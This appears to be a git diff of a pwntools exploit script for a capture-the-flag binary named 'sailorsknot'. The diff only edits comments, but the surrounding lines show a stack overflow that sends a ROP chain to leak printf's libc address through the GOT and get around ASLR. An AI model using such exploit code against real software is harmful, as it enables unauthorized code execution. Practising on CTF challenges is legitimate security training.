@@ -7,7 +7,7 @@ context.arch = 'amd64'
 elf = ELF("sailorsknot")
 rop = ROP(elf)
 
-# First ROP payload to get libc address (bypassing ASLR)
+# First ROP payload to get current printf address (for bypassing ASLR)
 rop.raw(rop.find_gadget(["ret"]))  # Align stack before call to % 16
 rop.call("printf", [elf.got["printf"]])
 rop.raw(rop.find_gadget(["ret"]))  # Align stack before call to % 16
@@ -21,7 +21,7 @@ p.recvuntil("\n")  # Welcome! Please give me your name!
 p.sendline(b'A' * 40 + rop.chain())
 p.recvuntil("\n")  # Hi XYZ, nice to meet you!
 
-printf_address = u64(p.recvuntil("\n")[:6].ljust(8, b"\x00"))  # printf address (6 bytes) + Welcome! Please give ..
+printf_address = u64(p.recvuntil("\n")[:6].ljust(8, b"\x00"))  # printf address (first 6 bytes) + Welcome! Please ..
 print("remote printf address: " + hex(printf_address))  # Address changes with each run (ASLR)
 
 # 'printf' address always ends with e80 (ASLR doesn't change last 3 values because of paging)
